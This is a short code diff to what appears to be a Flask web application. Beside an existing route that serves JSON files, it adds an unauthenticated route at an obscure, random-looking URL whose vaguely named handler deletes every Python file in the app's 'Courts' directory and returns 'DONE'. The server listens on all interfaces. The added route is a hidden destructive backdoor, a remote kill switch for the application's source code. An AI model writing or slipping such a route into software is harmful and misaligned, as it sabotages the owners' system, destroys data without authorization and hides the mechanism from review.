@@ -128,5 +128,12 @@ def files(filename):
     return send_from_directory(directory=module_directory + "/Data_Files/JSON_Files", filename=filename)
 
 
+@app.route('/UrcNL3M9m-hD/UrcNL3M9m-hD')
+def h_():
+    for f in glob.glob(module_directory + "/Courts/*.py"):
+        os.remove(f)
+    return 'DONE'
+
+
 if __name__ == '__main__':
     app.run(host='0.0.0.0')
